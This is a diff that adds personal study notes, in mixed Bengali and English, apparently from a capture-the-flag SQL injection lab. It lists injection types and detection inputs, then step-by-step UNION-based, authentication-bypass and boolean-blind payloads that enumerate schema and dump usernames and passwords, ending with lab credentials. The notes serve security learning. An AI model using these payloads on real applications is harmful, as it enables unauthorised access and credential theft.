@@ -1,0 +1,35 @@
+Three Types of SQL Injection
+	In-Band : যখন SQL Injection-এর Result সরাসরি Web Application-এর Response-এর মাধ্যমে পাওয়া যায়
+		Error-Based: Database Error Message Return করে, যা Database-এর Structure সম্পর্কে তথ্য প্রকাশ করতে পারে।
+		Union-Based: Attacker UNION ব্যবহার করে একটি দ্বিতীয় Query যুক্ত করে এবং Web Page-এর Output-এর মাধ্যমে Data Extract করার চেষ্টা করে।
+		
+	Blind : যখন Application সরাসরি Query-এর Result বা Error Message প্রদর্শন করে না 
+	Out-of-Band : যখন Attacker Database Server-কে একটি External Network Request করতে বাধ্য করে—যেমন DNS Lookup—এবং সেই পৃথক Channel-এর মাধ্যমে Data বাইরে পাঠানোর চেষ্টা করে 
+
+Detecting SQL Injection
+	Enter a single quote (') , Try " (double quote) , Enter ;-- , Test OR 1=1
+	
+Union-Based SQL Injection
+	1 UNION SELECT 1
+	1 UNION SELECT 1,2
+	1 UNION SELECT 1,2,3
+	0 UNION SELECT 1,2,3
+	0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()		shows that the current database is sqli_one
+	0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'		see the tables, including staff_users
+	0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'		reveals the columns: id, username, and password
+	0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users				Find FLAG
+Authentication Bypass
+	' OR 1=1;-- 			put in username's box & password anything, find the FLAG
+Boolean-Based Blind SQL Injection
+	admin123' UNION SELECT 1,2,3 where database() like '%';--									confirm injection
+	admin123' UNION SELECT 1,2,3 where database() like 's%';--									get the database name
+	admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--	find tables name
+	admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'u%';--		columns name
+	admin123' UNION SELECT 1,2,3 from users where username like 'a%';--								username
+	admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%';--					password
+
+	
+	sqli_one	article,staff_users	id,username,password
+	admin:p4ssword
+	martin:pa$$word
+	jim:work123
